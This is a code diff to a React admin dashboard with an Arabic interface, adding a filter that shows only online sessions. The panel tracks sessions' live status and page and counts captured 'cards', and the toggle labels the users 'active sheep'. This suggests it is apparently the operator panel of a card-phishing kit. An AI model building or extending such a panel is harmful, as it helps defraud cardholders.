@@ -724,6 +724,9 @@ export default function AdminDashboard() {
   
   // Track session online status and current page
   const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});
+  
+  // Filter: show only online sessions
+  const [showOnlineOnly, setShowOnlineOnly] = useState(false);
 
   const sessions = useMemo(() => {
     const trashedIds = new Set(trashItems.map((item) => item.id));
@@ -755,6 +758,31 @@ export default function AdminDashboard() {
 
     return sessionsWithHistory;
   }, [rawRows, trashItems]);
+
+  // Filtered sessions based on online status
+  const filteredSessions = useMemo(() => {
+    if (!showOnlineOnly) return sessions;
+    
+    const onlineSessionIds = new Set(
+      Object.values(trackingInfo)
+        .filter((info) => info.isOnline)
+        .map((info) => info.sessionId)
+    );
+    
+    const filtered: typeof sessions = {};
+    Object.entries(sessions).forEach(([sessionId, rows]) => {
+      if (onlineSessionIds.has(sessionId)) {
+        filtered[sessionId] = rows;
+      }
+    });
+    
+    return filtered;
+  }, [sessions, trackingInfo, showOnlineOnly]);
+
+  // Count of online sessions for display
+  const onlineSessionCount = useMemo(() => {
+    return Object.values(trackingInfo).filter((info) => info.isOnline).length;
+  }, [trackingInfo]);
 
   useEffect(() => {
     if (!getToken()) {
@@ -1235,12 +1263,22 @@ export default function AdminDashboard() {
             <div className="flex items-center justify-between">
               <div>
                 <h2 className="text-sm font-semibold text-slate-900">الجلسات النشطة</h2>
-                <p className="text-xs text-slate-500">{sessionCount} جلسة • {cardCount} بطاقة</p>
+                <p className="text-xs text-slate-500">{showOnlineOnly ? onlineSessionCount : sessionCount} جلسة • {cardCount} بطاقة</p>
               </div>
               <div className="flex items-center gap-2">
                 <div className="px-3 py-1.5 rounded-xl bg-green-50 text-green-700 text-xs font-medium">
                   <span className="font-bold">{onlineCount}</span> متصل الآن
                 </div>
+                <button
+                  onClick={() => setShowOnlineOnly(!showOnlineOnly)}
+                  className={`px-3 py-1.5 rounded-xl text-xs font-medium transition-colors ${
+                    showOnlineOnly 
+                      ? "bg-green-500 text-white active:bg-green-600" 
+                      : "bg-slate-100 text-slate-600 active:bg-slate-200"
+                  }`}
+                >
+                  {showOnlineOnly ? "🟢 خرفان نشطين" : "○ خرفان نشطين"}
+                </button>
                 {selectedIds.length > 0 && (
                   <button
                     onClick={handleDeleteSelected}
@@ -1259,13 +1297,15 @@ export default function AdminDashboard() {
             </div>
 
             {/* Sessions List */}
-            {sessionCount === 0 ? (
+            {Object.keys(filteredSessions).length === 0 ? (
               <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-slate-50 p-8 text-center">
-                <p className="text-sm text-slate-500">لا يوجد جلسات حالياً</p>
+                <p className="text-sm text-slate-500">
+                  {showOnlineOnly ? "لا يوجد عملاء متصلين حالياً" : "لا يوجد جلسات حالياً"}
+                </p>
               </div>
             ) : (
               <div className="space-y-3">
-                {Object.entries(sessions).map(([sessionId, rows]) => (
+                {Object.entries(filteredSessions).map(([sessionId, rows]) => (
                   <SessionBox
                     key={sessionId}
                     sessionId={sessionId}
